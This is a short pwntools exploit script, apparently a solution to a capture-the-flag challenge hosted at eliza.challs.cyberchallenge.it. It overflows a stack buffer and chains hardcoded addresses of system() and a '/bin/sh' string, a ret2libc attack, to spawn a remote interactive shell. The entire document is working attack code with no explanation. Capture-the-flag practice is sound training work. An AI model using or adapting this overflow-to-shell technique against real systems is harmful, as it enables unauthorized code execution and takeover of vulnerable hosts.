from pwn import *

BIN_SH = 0x7ffff7f6304f
SYSTEM = 0x7ffff7e19920
context.log_level = 'debug'

r = remote('eliza.challs.cyberchallenge.it', 9131)
r.sendlineafter(b'Ask me anything...\n', b'A' * (0x50+8))

r.recv()
r.sendline(
    b'\n' * (0x50 + 8 * 2) +
    p64(SYSTEM) +
    b'A' * 8 +
    p64(BIN_SH)
)
r.sendline( b'a' * (0x50 + 8 * 2) )

r.interactive()